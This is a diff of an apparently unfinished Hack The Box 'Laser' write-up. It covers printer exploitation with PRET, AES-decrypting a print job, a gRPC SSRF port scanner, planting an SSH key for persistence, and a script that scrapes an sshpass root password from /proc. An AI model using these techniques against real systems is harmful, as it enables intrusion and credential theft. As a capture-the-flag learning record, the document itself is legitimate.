@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/3f0e7221c3bf98e7f00e3b9531e984507d6b57db/linux-machines/insane/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,21 +10,19 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
 ### Nmap scan
 
-
-
 I started my enumeration with an nmap scan of `10.10.10.201`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ nmap -sCV -n -v -p- -oA laser 10.10.10.201                
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 15:31 EST
@@ -112,11 +110,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 44.32 seconds
 ```
 
-3 ports open, 22 - SSH, 9000, and 9001.  Searching for what uses ports 9000 and 9001 turns out these are commonly used by printers
+3 ports open, 22 - SSH, 9000, and 9001. Searching for what uses ports 9000 and 9001 turns out these are commonly used by printers
 
-http://www.irongeek.com/i.php?page=security/networkprinterhacking
+[http://www.irongeek.com/i.php?page=security/networkprinterhacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ telnet 10.10.10.201 9100
 Trying 10.10.10.201...
@@ -135,7 +133,7 @@ Connection closed.
 
 connected with telnet and all text sent just got back `?`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ sudo nmap -sU -p161 --reason 10.10.10.201
 sudo: unable to resolve host kali: Name or service not known
@@ -149,17 +147,17 @@ PORT    STATE  SERVICE REASON
 Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
 ```
 
-Unfortunately it seems as if SNMP is not enabled on this machine (or is using a non-standard port?) as this would have given a good path forward
+Unfortunately it seems as if SNMP is not enabled on this machine \(or is using a non-standard port?\) as this would have given a good path forward
 
-https://book.hacktricks.xyz/pentesting/9100-pjl
+[https://book.hacktricks.xyz/pentesting/9100-pjl](https://book.hacktricks.xyz/pentesting/9100-pjl)
 
-https://github.com/RUB-NDS/PRET
+[https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)
 
 Printer Exploitation Toolkit
 
-http://hacking-printers.net/wiki/
+[http://hacking-printers.net/wiki/](http://hacking-printers.net/wiki/)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
 └─$ python pret.py -o laser.pret 10.10.10.201 ps                                                    1 ⨯
       ________________                                             
@@ -171,10 +169,10 @@ http://hacking-printers.net/wiki/
   | ||/.´---.||    | ||      「 pentesting tool that made          
   |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
   |_||=L==H==||_|__|/                                              
-                                                                   
+
      (ASCII art by                                                 
      Jan Foerster)                                                 
-                                                                   
+
 Connection to 10.10.10.201 established
 Command execution failed (timed out)
 
@@ -189,7 +187,7 @@ Connection to 10.10.10.201 established
 10.10.10.201:/> test
 Unknown command: 'test'
 10.10.10.201:/> 
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
 └─$ python pret.py -o laser.pret 10.10.10.201 pcl
       ________________                                             
@@ -201,10 +199,10 @@ Unknown command: 'test'
   | ||/.´---.||    | ||      「 pentesting tool that made          
   |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
   |_||=L==H==||_|__|/                                              
-                                                                   
+
      (ASCII art by                                                 
      Jan Foerster)                                                 
-                                                                   
+
 Connection to 10.10.10.201 established
 Device:   Unknown printer
 
@@ -217,9 +215,9 @@ cat    debug   discover  exit  get   info  loop  open   put       site
 close  delete  edit      free  help  load  ls    print  selftest  timeout
 ```
 
-Got a pret shell on the machine using the PCL printer language.  I used the `help` command to get a list of further options to try
+Got a pret shell on the machine using the PCL printer language. I used the `help` command to get a list of further options to try
 
-```
+```text
 10.10.10.201:/> ls
 Command execution failed (timed out)
 
@@ -231,9 +229,9 @@ This is a virtual pclfs. Use 'put' to upload files.
 
 Trying the `ls` command gave me an error message that said I could use `put` to upload files
 
->Due to its limited capabilities, PCL is hard to exploit from a security perspective unless one discovers interesting proprietary commands in some printer manufacturers's PCL flavour. The PRET tool implements a virtual, PCL-based file system which uses macros to save file content and metadata in the printer's memory. This hack shows that even a device which supports only minimalist page description languages like PCL can be used to store arbitrary files like copyright infringing material. Although turning a printer into a file sharing service is not a security vulnerability per se, it may apply as ‘misuse of service’ depending on the corporate policy. 
+> Due to its limited capabilities, PCL is hard to exploit from a security perspective unless one discovers interesting proprietary commands in some printer manufacturers's PCL flavour. The PRET tool implements a virtual, PCL-based file system which uses macros to save file content and metadata in the printer's memory. This hack shows that even a device which supports only minimalist page description languages like PCL can be used to store arbitrary files like copyright infringing material. Although turning a printer into a file sharing service is not a security vulnerability per se, it may apply as ‘misuse of service’ depending on the corporate policy.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
 └─$ python pret.py -o laser.pret 10.10.10.201 pjl
       ________________                                             
@@ -245,10 +243,10 @@ Trying the `ls` command gave me an error message that said I could use `put` to 
   | ||/.´---.||    | ||      「 pentesting tool that made          
   |-||/_____\||-.  | |´         dumpster diving obsolete‥ 」       
   |_||=L==H==||_|__|/                                              
-                                                                   
+
      (ASCII art by                                                 
      Jan Foerster)                                                 
-                                                                   
+
 Connection to 10.10.10.201 established
 Device:   LaserCorp LaserJet 4ML
 
@@ -269,7 +267,7 @@ debug   display   format  id    mirror  print      selftest  traversal
 
 After testing all of the PCL commands and getting nothing I went back and tried the third language, PJL, and got another shell with many more commands
 
-```
+```text
 10.10.10.201:/> ls
 d        -   pjl
 10.10.10.201:/> cd pjl
@@ -284,16 +282,16 @@ b'VfgBAAAAAADOiDS0d+nn3sdU24Myj/njDqp6+zamr0JMcj84pLvGcvxF5IEZAbjjAH
 dgblOUDj6BOA+MLrAiC/chpVOipOMtlonY1lxELrGFvQKAO8RSMUZNovS5gkLUolUkX3X6OeCsYJRf20mrgSSQ'
 ```
 
-I made the mistake of `cat`ing the file at first.  Don't do this, unless you want to copy the extremely long base64 string and recreate the file yourself.  Use `get` instead...
+I made the mistake of `cat`ing the file at first. Don't do this, unless you want to copy the extremely long base64 string and recreate the file yourself. Use `get` instead...
 
-```
+```text
 10.10.10.201:/pjl/jobs> get queued
 172199 bytes received.
 ```
 
 Use Get.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
 └─$ echo queued | base64 -d > queued.decoded
 base64: invalid input
@@ -301,7 +299,7 @@ base64: invalid input
 
 After removing the extra characters from the file I tried to base64 decode it, but it seemed to be invalid encoding; I decided to keep enumerating to see if I could find anything to help me move forward.
 
-```
+```text
 10.10.10.201:/pjl/jobs> df
 VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
 0:     1755136    1718272    <HT>     <HT>  READ-WRITE
@@ -309,7 +307,7 @@ VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
 
 I did seem to have read-write access on the local drive
 
-```
+```text
 10.10.10.201:/pjl/jobs> id
 LaserCorp LaserJet 4ML
 10.10.10.201:/pjl/jobs> pagecount
@@ -369,7 +367,7 @@ Setting printer's display message to "test"
 
 nothing useful
 
-```
+```text
 10.10.10.201:/> env
 COPIES=1 [2 RANGE]
         1
@@ -482,7 +480,7 @@ LPARM:ENCRYPTION MODE=AES [CBC]
 
 The line `LPARM:ENCRYPTION MODE=AES [CBC]` looked like it might be useful
 
-```
+```text
 10.10.10.201:/> info
 Show information:  info <category>
   info config      - Provides configuration information.
@@ -585,7 +583,7 @@ TIMED=0 [2 RANGE]
 
 The `info` command seemed to give pretty much the same information as some of the other commands
 
-```
+```text
 10.10.10.201:/> mirror
 Creating mirror of /
 Traversing pjl/
@@ -596,7 +594,7 @@ Traversing pjl/jobs/
 
 The `mirror` command seemed to be pretty interesting, as it created a mirror of the print queue on my local machine
 
-```
+```text
 10.10.10.201:/> nvram
 NVRAM operations:  nvram <operation>
   nvram dump [all]         - Dump (all) NVRAM to local file.
@@ -607,9 +605,9 @@ Writing copy to nvram/10.10.10.201
 ..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................k...e....y.....13u94r6..643rv19u
 ```
 
-The nvram command had a dump operation which gave me what looked to be a possible encryption key.  I wasn't sure that the output was showing everything I needed so I started Wireshark and did a packet capture to see what other data was being dumped.
+The nvram command had a dump operation which gave me what looked to be a possible encryption key. I wasn't sure that the output was showing everything I needed so I started Wireshark and did a packet capture to see what other data was being dumped.
 
-```
+```text
 DATA = 49
 DATA = 51
 DATA = 118
@@ -630,9 +628,9 @@ DATA = 57
 DATA = 117
 ```
 
-The key was decimal encoded, so I used CyberChef to decode it and got the key `13vu94r6643rv19u`. For some reason the console output didn't decode it properly. (Im also not sure what the `46` characters are in the middle of the two halves, but they weren't needed.  Some sort of delimiter for the two halves?)
+The key was decimal encoded, so I used CyberChef to decode it and got the key `13vu94r6643rv19u`. For some reason the console output didn't decode it properly. \(Im also not sure what the `46` characters are in the middle of the two halves, but they weren't needed. Some sort of delimiter for the two halves?\)
 
-```
+```text
 10.10.10.201:/> selftest
 10.10.10.201:/> traversal
 Path traversal unset.
@@ -646,11 +644,11 @@ Not available.
 ?
 ```
 
-After going through pretty much all of the commands and finding very little useful information, I went back to the queue I had downloaded.  Since I had a potential encryption key, and had noted the encryption method was AES, which outputs base64 encoded material that wont decode properly...I figured I was on to something.
+After going through pretty much all of the commands and finding very little useful information, I went back to the queue I had downloaded. Since I had a potential encryption key, and had noted the encryption method was AES, which outputs base64 encoded material that wont decode properly...I figured I was on to something.
 
-https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode
+[https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode](https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode)
 
-https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
+[https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256](https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)
 
 ```python
 #!/usr/bin/env python3
@@ -679,7 +677,7 @@ I wrote a simple python script to decode the `queued` file after I stripped out 
 
 Pics
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ file q-out                                                                                      2 ⨯
 q-out: PDF document, version 1.4
@@ -687,7 +685,7 @@ q-out: PDF document, version 1.4
 
 The file that was in the print queue turned out to be a PDF file
 
-```
+```text
 Description
 Used to parse the feeds from various sources (Printers, Network devices, Web servers and other
 connected devices). These feeds can be used in checking load balancing, health status, tracing.
@@ -740,15 +738,15 @@ Bugs
 4. Merge staging core to feed engine
 ```
 
-The PDF File contained instructions for interacting with a print API using gRPC on port 9000.  It also contained the hostname `printer.laserinternal.htb` which I added to my `/etc/hosts` file
+The PDF File contained instructions for interacting with a print API using gRPC on port 9000. It also contained the hostname `printer.laserinternal.htb` which I added to my `/etc/hosts` file
 
-* https://grpc.io/docs/languages/python/basics/
-* https://grpc.io/docs/what-is-grpc/introduction/
-* https://developers.google.com/protocol-buffers/docs/overview
-* https://developers.google.com/protocol-buffers/docs/proto3
-* https://developers.google.com/protocol-buffers/docs/style
+* [https://grpc.io/docs/languages/python/basics/](https://grpc.io/docs/languages/python/basics/)
+* [https://grpc.io/docs/what-is-grpc/introduction/](https://grpc.io/docs/what-is-grpc/introduction/)
+* [https://developers.google.com/protocol-buffers/docs/overview](https://developers.google.com/protocol-buffers/docs/overview)
+* [https://developers.google.com/protocol-buffers/docs/proto3](https://developers.google.com/protocol-buffers/docs/proto3)
+* [https://developers.google.com/protocol-buffers/docs/style](https://developers.google.com/protocol-buffers/docs/style)
 
-```
+```text
 service FooService {
   rpc GetSomething(FooRequest) returns (FooResponse);
 }
@@ -756,17 +754,16 @@ service FooService {
 
 > The first line of the file specifies that you're using proto3 syntax: if you don't do this the protocol buffer compiler will assume you are using proto2. This must be the first non-empty, non-comment line of the file.
 
-https://developers.google.com/protocol-buffers/docs/pythontutorial
-https://grpc.io/docs/languages/python/quickstart/
+[https://developers.google.com/protocol-buffers/docs/pythontutorial](https://developers.google.com/protocol-buffers/docs/pythontutorial) [https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
 ```
 
 This created two files: `laser_pb2_grpc.py` and `laser_pb2.py`
 
-```
+```text
 import laser_pb2_grpc
 import laser_pb2
 import grpc
@@ -784,9 +781,9 @@ def run():
 run()
 ```
 
-created a python client to connect to port 9000 on the server and send my request.  Next I created a netcat listener to catch the return message
+created a python client to connect to port 9000 on the server and send my request. Next I created a netcat listener to catch the return message
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ nc -lvnp 8099                                 
 listening on [any] 8099 ...
@@ -799,14 +796,14 @@ Accept: */*
 
 I got a connection back to my netcat listener, but I wasn't sure what to do with it at that point. Server Side Request Forgery
 
-```
+```text
 On successful data transmission you should see a message....
 return service_pb2.Data(feed='Pushing feeds')
 ```
 
 The PDF mentioned that I should get back a message like the one above, but I did not get any messages back like that
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ python3 grpc_client.py                                                                          1 ⨯
 Traceback (most recent call last):
@@ -827,7 +824,7 @@ grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
 
 python gRPC client
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ python3 client.py
 Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')
@@ -835,7 +832,7 @@ Exception calling application: (6, 'Could not resolve host: printer.laserinterna
 
 got an error message with a new hostname
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ ping printer.laserinternal.htb               
 PING printer.laserinternal.htb (10.10.10.201) 56(84) bytes of data.
@@ -853,21 +850,19 @@ put in info about pinging back my machine
 
 Got a "Connection refused error", can use this to filter responses
 
-According to https://developers.google.com/maps-booking/reference/grpc-api/status_codes, error code 2 for gRPC means:
+According to [https://developers.google.com/maps-booking/reference/grpc-api/status\_codes](https://developers.google.com/maps-booking/reference/grpc-api/status_codes), error code 2 for gRPC means:
 
-> 2 	UNKNOWN 	For example, this error may be returned when a Status value received from another address space belongs to an error-space that isn't known in this address space. Also errors raised by APIs that don't return enough error information may be converted to this error.
-
+> 2 UNKNOWN For example, this error may be returned when a Status value received from another address space belongs to an error-space that isn't known in this address space. Also errors raised by APIs that don't return enough error information may be converted to this error.
 
 No matter what data I sent it, I would get the above error message. After doing some research, I found that the error code `status = StatusCode.UNKNOWN` means that the server is misconfigured. There was an issue raised for gRPC on GitHub, but it was closed because:
 
->I found the issue is my GRPC server is enabled with default development certificate, and it requires SSL.
+> I found the issue is my GRPC server is enabled with default development certificate, and it requires SSL.
 
-https://github.com/grpc/grpc/issues/22462
+[https://github.com/grpc/grpc/issues/22462](https://github.com/grpc/grpc/issues/22462)
 
-There may be an internal SSL port open that I cannot reach, therefore the errors.  I need some way of enumerating the inside
+There may be an internal SSL port open that I cannot reach, therefore the errors. I need some way of enumerating the inside
 
-https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python
-https://www.geeksforgeeks.org/port-scanner-using-python/
+[https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python](https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python) [https://www.geeksforgeeks.org/port-scanner-using-python/](https://www.geeksforgeeks.org/port-scanner-using-python/)
 
 ```python
 import laser_pb2_grpc
@@ -881,11 +876,11 @@ def scan():
     #Run the below code for all 65535 ports (minus 0)
     for port in range(1,65535):
         print(f"Trying port: {port}", end ='\r', flush = True)
-        
+
         #Use insecure channel since we do not have credentials
         channel = grpc.insecure_channel('printer.laserinternal.htb:9000')
         stub = laser_pb2_grpc.PrintStub(channel)
-        
+
         #Testing to see if there are more ports open on the internal localhost using same message
         message = '{' + f'"feed_url": "http://localhost:{port}"' + '}'
         #print(f"Message sent is {message}")
@@ -893,13 +888,13 @@ def scan():
         content = laser_pb2.Content(data=enc_message)
         try:
             response = stub.Feed(content)
-            
+
             #Print the ports that respond to our connection, along with the message
-			print(f"Port {port} open!")
+            print(f"Port {port} open!")
             print(f"Connection received on port: {port}",response)
-			print("")
+            print("")
             #print(str(response))
-            
+
         except Exception as e:
             #str_e = str(e)
             #print(f"There was an error: {str_e}")
@@ -907,14 +902,14 @@ def scan():
                 continue
             print(f"Port {port} open!")
             print(e.details())
-			print("")
+            print("")
 
 scan()
 ```
 
-The scanner was very slow, as it made a full connection then sent its message and waited for a reply for every port.  I thought about making the script multithreaded, but had to go out so I left it running instead
+The scanner was very slow, as it made a full connection then sent its message and waited for a reply for every port. I thought about making the script multithreaded, but had to go out so I left it running instead
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ python3 grpc_scan.py
 Port 22 open!
@@ -935,28 +930,23 @@ Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')
 
 When I got back home I found two more ports open, and port `8983` responded with the message that was expected from the PDF.
 
-
-
 back up to scanner
 
--------------------------------------------------------------
+A search for port 8983 exploit led me to [https://www.exploit-db.com/exploits/47572](https://www.exploit-db.com/exploits/47572)
 
-A search for port 8983 exploit led me to https://www.exploit-db.com/exploits/47572
+Solr is an open source application from Apache which provides searching and indexing capabilities for large amounts of data.
 
- Solr is an open source application from Apache which provides searching and indexing capabilities for large amounts of data.
+[https://github.com/veracode-research/solr-injection](https://github.com/veracode-research/solr-injection)
 
-https://github.com/veracode-research/solr-injection
+[https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability](https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability)
 
-https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability
+[https://github.com/jas502n/solr\_rce](https://github.com/jas502n/solr_rce)
 
-https://github.com/jas502n/solr_rce
-
-
-searched for how to interact with gRPC through command line and found https://github.com/fullstorydev/grpcurl
+searched for how to interact with gRPC through command line and found [https://github.com/fullstorydev/grpcurl](https://github.com/fullstorydev/grpcurl)
 
 > grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
-
-> The main purpose for this tool is to invoke RPC methods on a gRPC server from the command-line. gRPC servers use a binary encoding on the wire (protocol buffers, or "protobufs" for short). So they are basically impossible to interact with using regular curl (and older versions of curl that do not support HTTP/2 are of course non-starters). This program accepts messages using JSON encoding, which is much more friendly for both humans and scripts.
+>
+> The main purpose for this tool is to invoke RPC methods on a gRPC server from the command-line. gRPC servers use a binary encoding on the wire \(protocol buffers, or "protobufs" for short\). So they are basically impossible to interact with using regular curl \(and older versions of curl that do not support HTTP/2 are of course non-starters\). This program accepts messages using JSON encoding, which is much more friendly for both humans and scripts.
 
 --Put python scripts here--
 
@@ -968,7 +958,7 @@ searched for how to interact with gRPC through command line and found https://gi
 
 ### Finding user creds
 
-```
+```text
 solr@laser:~$ id && hostname
 uid=114(solr) gid=120(solr) groups=120(solr)
 laser
@@ -976,13 +966,13 @@ laser
 
 got a shell on the machine from my waiting nc listener
 
-```
+```text
 solr@laser:~$ echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNjkkEoBIEUE1qbriniZITFVwyL5zjbjJopB07xl9UAgAjbkTEx/IfL5xvd6cDNUHmW5KEkXTiNJm3sLBFfloVY=' >> .ssh/authorized_keys
 ```
 
 put my public key in the user's .ssh folder so I could log in
 
-```
+```text
 solr@laser:/tmp/cypher/.ssh$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -1024,10 +1014,9 @@ solr:x:114:120::/var/solr:/bin/bash
 
 there were only two users who could log in, solr and root
 
-
 ### User.txt
 
-```
+```text
 solr@laser:~$ cd /home/solr
 solr@laser:/home/solr$ ls -la
 total 16
@@ -1045,7 +1034,7 @@ solr@laser:/home/solr$ cat user.txt
 
 ### Enumeration as `solr`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ ssh solr@10.10.10.201 -i solr.key 
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
@@ -1079,9 +1068,9 @@ Last login: Tue Aug  4 07:01:35 2020 from 10.10.14.3
 solr@laser:~$
 ```
 
-after creating a key I was able to log in using ssh.  Upon login it told me the IP addresses for some interfaces
+after creating a key I was able to log in using ssh. Upon login it told me the IP addresses for some interfaces
 
-```
+```text
 solr@laser:/home/solr$ ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -1115,8 +1104,7 @@ solr@laser:/home/solr$ ip a
 
 there semed to be a docker interface runnng on 172.17.0.1/16, and a container that looked to be hosted at 172.18.0.1
 
-
-```
+```text
 solr@laser:~$ ps aux > /dev/shm/ps
 solr@laser:~$ vim /dev/shm/ps
 root        1053  0.0  0.1   9400  2976 ?        S    Dec18   0:00 sudo -u printer /opt/printer/printer.py 9100 /opt/printer/jobs/ /opt/printer/logs/print.log
@@ -1197,34 +1185,32 @@ solr     1713735  0.0  0.1   8876  3352 pts/5    R+   18:43   0:00 ps aux
 
 I checked for processes running that might give me an indication at what ay be running in the containers, and noticed an interesting process associated with the container I noticed
 
-```
+```text
 sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /opt/updates/files/jenkins-feed root@172.18.0.2:/root/feeds/
 ```
 
 the sshpass program is being used here to pass `root`'s password to secure copy in order to move some file `jenkins-feed` to a folder on the docker container
 
+> sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interac‐ tive" password authentication, but in non-interactive mode.
+>
+> ssh uses direct TTY access to make sure that the password is indeed issued by an interactive keyboard user. Sshpass runs ssh in a dedicated tty, fooling it into thinking it is getting the password from an interactive user.
+>
+> The command to run is specified after sshpass' own options. Typically it will be "ssh" with arguments, but it can just as well be any other command. The password prompt used by ssh is, however, currently hardcoded into sshpass.
+>
+> Options If no option is given, sshpass reads the password from the standard input. The user may give at most one alternative source for the password:
+>
+> ```text
+>    -p password
+>          The  password  is  given  on the command line. Please note the section titled "SECURITY CONSIDERATIONS".
+> ```
+>
+> SECURITY CONSIDERATIONS First and foremost, users of sshpass should realize that ssh's insistance on only getting the password interactively is not without reason. It is close to impossible to securely store the password, and users of sshpass should consider whether ssh's public key authentication provides the same end-user experience, while involving less hassle and being more secure.
+>
+> ```text
+>   The  -p  option should be considered the least secure of all of sshpass's options.  All system users can see the password in the command line with a simple "ps"  command.  Sshpass  makes  a minimal  attempt  to hide the password, but such attempts are doomed to create race conditions without actually solving the problem. Users of sshpass are encouraged to use one of the  other password passing techniques, which are all more secure.
+> ```
 
-> sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interac‐
-       tive" password authentication, but in non-interactive mode.
-
-> ssh uses direct TTY access to make sure that the password is indeed issued by  an  interactive keyboard user. Sshpass runs ssh in a dedicated tty, fooling it into thinking it is getting the password from an interactive user.
-
-> The command to run is specified after sshpass' own options. Typically it will  be  "ssh"  with arguments,  but  it can just as well be any other command. The password prompt used by ssh is, however, currently hardcoded into sshpass.
-
-> Options
-       If no option is given, sshpass reads the password from the standard input. The user  may  give
-       at most one alternative source for the password:
-
->        -p password
->              The  password  is  given  on the command line. Please note the section titled "SECURITY CONSIDERATIONS".
-
-> SECURITY CONSIDERATIONS
->       First and foremost, users of sshpass should realize that ssh's insistance on only getting  the password  interactively is not without reason. It is close to impossible to securely store the password, and users of sshpass should consider whether ssh's public  key  authentication  provides the same end-user experience, while involving less hassle and being more secure.
-
->       The  -p  option should be considered the least secure of all of sshpass's options.  All system users can see the password in the command line with a simple "ps"  command.  Sshpass  makes  a minimal  attempt  to hide the password, but such attempts are doomed to create race conditions without actually solving the problem. Users of sshpass are encouraged to use one of the  other password passing techniques, which are all more secure.
-
-
-code for sshpass: https://github.com/kevinburke/sshpass/blob/master/main.c
+code for sshpass: [https://github.com/kevinburke/sshpass/blob/master/main.c](https://github.com/kevinburke/sshpass/blob/master/main.c)
 
 ```c
 // Parse the command line. Fill in the "args" global struct with the results. Return argv offset
@@ -1243,28 +1229,28 @@ static int parse_options( int argc, char *argv[] )
     error=RETURN_CONFLICTING_ARGUMENTS; }
 
     while( (opt=getopt(argc, argv, "+f:d:p:P:heVv"))!=-1 && error==-1 ) {
-	switch( opt ) {
-	case 'f':
-	    // Password should come from a file
-	    VIRGIN_PWTYPE;
-	    
-	    args.pwtype=PWT_FILE;
-	    args.pwsrc.filename=optarg;
-	    break;
-	case 'd':
-	    // Password should come from an open file descriptor
-	    VIRGIN_PWTYPE;
+    switch( opt ) {
+    case 'f':
+        // Password should come from a file
+        VIRGIN_PWTYPE;
 
-	    args.pwtype=PWT_FD;
-	    args.pwsrc.fd=atoi(optarg);
-	    break;
-	case 'p':
-	    // Password is given on the command line
-	    VIRGIN_PWTYPE;
+        args.pwtype=PWT_FILE;
+        args.pwsrc.filename=optarg;
+        break;
+    case 'd':
+        // Password should come from an open file descriptor
+        VIRGIN_PWTYPE;
 
-	    args.pwtype=PWT_PASS;
-	    args.pwsrc.password=strdup(optarg);
-            
+        args.pwtype=PWT_FD;
+        args.pwsrc.fd=atoi(optarg);
+        break;
+    case 'p':
+        // Password is given on the command line
+        VIRGIN_PWTYPE;
+
+        args.pwtype=PWT_PASS;
+        args.pwsrc.password=strdup(optarg);
+
             // Hide the original password from the command line
             {
                 int i;
@@ -1272,54 +1258,54 @@ static int parse_options( int argc, char *argv[] )
                 for( i=0; optarg[i]!='\0'; ++i )
                     optarg[i]='z';
             }
-	    break;
+        break;
         case 'P':
             args.pwprompt=optarg;
             break;
         case 'v':
             args.verbose++;
             break;
-	case 'e':
-	    VIRGIN_PWTYPE;
+    case 'e':
+        VIRGIN_PWTYPE;
 
-	    args.pwtype=PWT_PASS;
-	    args.pwsrc.password=getenv("SSHPASS");
+        args.pwtype=PWT_PASS;
+        args.pwsrc.password=getenv("SSHPASS");
             if( args.pwsrc.password==NULL ) {
                 fprintf(stderr, "sshpass: -e option given but SSHPASS environment variable not set\n");
 
                 error=RETURN_INVALID_ARGUMENTS;
             }
-	    break;
-	case '?':
-	case ':':
-	    error=RETURN_INVALID_ARGUMENTS;
-	    break;
-	case 'h':
-	    error=RETURN_NOERROR;
-	    break;
-	case 'V':
-	    printf("%s\n"
+        break;
+    case '?':
+    case ':':
+        error=RETURN_INVALID_ARGUMENTS;
+        break;
+    case 'h':
+        error=RETURN_NOERROR;
+        break;
+    case 'V':
+        printf("%s\n"
                     "(C) 2006-2011 Lingnu Open Source Consulting Ltd.\n"
                     "(C) 2015-2016 Shachar Shemesh\n"
-		    "This program is free software, and can be distributed under the terms of the GPL\n"
-		    "See the COPYING file for more information.\n"
+            "This program is free software, and can be distributed under the terms of the GPL\n"
+            "See the COPYING file for more information.\n"
                     "\n"
                     "Using \"%s\" as the default password prompt indicator.\n", PACKAGE_STRING, PASSWORD_PROMPT );
-	    exit(0);
-	    break;
-	}
+        exit(0);
+        break;
+    }
     }
 
     if( error>=0 )
-	return -(error+1);
+    return -(error+1);
     else
-	return optind;
+    return optind;
 }
 ```
 
 the `-p` option takes in the original password from argument input and obfuscates it by replacing each character with a 'z', one character at a time. In the `ps aux` output I got earlier I saw the command `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ echo -n zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz | wc -c
 32
@@ -1345,22 +1331,22 @@ while(1):
             print("")
 ```
 
-I wrote a python script to read the contents of each process in `/procs` and see if they had a `cmdline` file in them.  If the file exists then it looked in the data for the word `sshpass` if it found that it would look to see if it also contained multiple 'z' characters, and if not, would print the command line that made that process
+I wrote a python script to read the contents of each process in `/procs` and see if they had a `cmdline` file in them. If the file exists then it looked in the data for the word `sshpass` if it found that it would look to see if it also contained multiple 'z' characters, and if not, would print the command line that made that process
 
-```
+```text
 solr@laser:/dev/shm$ python3 get_pass.py
 'sshpass\x00-p\x00c413d115b3d87664499624e7826d8c5a\x00scp\x00/opt/updates/files/graphql-feed\x00root@172.18.0.2:/root/feeds/\x00'
 ```
 
-AFter waiting for quite some time, I got what I wanted.  cleaning up the output makes the command: 
+AFter waiting for quite some time, I got what I wanted. cleaning up the output makes the command:
 
-```
+```text
 sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/bug-feed root@172.18.0.2:/root/feeds/
 ```
 
 The password was `c413d115b3d87664499624e7826d8c5a`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ echo -n c413d115b3d87664499624e7826d8c5a | wc -c                                
 32
